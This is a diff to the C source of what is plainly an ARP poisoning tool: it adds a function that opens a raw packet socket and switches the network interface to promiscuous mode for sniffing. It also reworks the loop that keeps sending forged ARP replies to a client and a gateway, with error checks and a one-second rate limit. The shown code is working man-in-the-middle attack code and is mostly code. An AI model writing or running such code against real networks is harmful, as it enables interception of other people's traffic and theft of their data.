@@ -19,14 +19,36 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stropts.h>
 #include <sys/ioctl.h>
 #include <sys/param.h>
 #include <sys/raw.h>
 #include <sys/socket.h>
 #include <sys/types.h>
+#include <time.h>
 #include <unistd.h>
 
 #include "poison.h"
+
+int peep_sock(const char* iface) {
+    struct ifreq ifopts;
+    strncpy(ifopts.ifr_name, iface, IFNAMSIZ - 1);
+    int peep_sock;
+    if ((peep_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
+        return -1;
+    }
+
+    if (ioctl(peep_sock, SIOCGIFFLAGS, &ifopts) == -1) {
+        return -1;
+    }
+
+    ifopts.ifr_flags |= IFF_PROMISC;
+
+    if (ioctl(peep_sock, SIOCSIFFLAGS, &ifopts) == -1) {
+        return -1;
+    }
+    return peep_sock;
+}
 
 void* zerg_arp(void* targets) {
     //copy it local
@@ -105,14 +127,26 @@ void* zerg_arp(void* targets) {
     memcpy(caddr.sll_addr, t.cmac, ETHER_ADDR_LEN);
     memcpy(gaddr.sll_addr, t.gmac, ETHER_ADDR_LEN);
 
-    for (;;) {
+    static struct timespec tv, tvt;
+    tv.tv_sec  = 1;
+    tv.tv_nsec = 0;
+
+    puts("==-started flooding-==");
+    while (1) {
         //hit the client
-        sendto(t.sock, cbuf, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
-            (struct sockaddr*)&caddr, sizeof(struct sockaddr_ll));
+        if (sendto(t.sock, cbuf, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
+            (struct sockaddr*)&caddr, sizeof(struct sockaddr_ll)) == -1) {
+            perror("sendto");
+            break;
+        }
         //hit the gateway
-        sendto(t.sock, gbuf, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
-            (struct sockaddr*)&gaddr, sizeof(struct sockaddr_ll));
-        sleep(1);
+        if (sendto(t.sock, gbuf, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
+            (struct sockaddr*)&gaddr, sizeof(struct sockaddr_ll)) == -1) {
+            perror("sendto");
+            break;
+        }
+        //calls are nonblocking so a sleep is required to rate limit
+        nanosleep(&tv, &tvt);
     }
 
     return NULL;
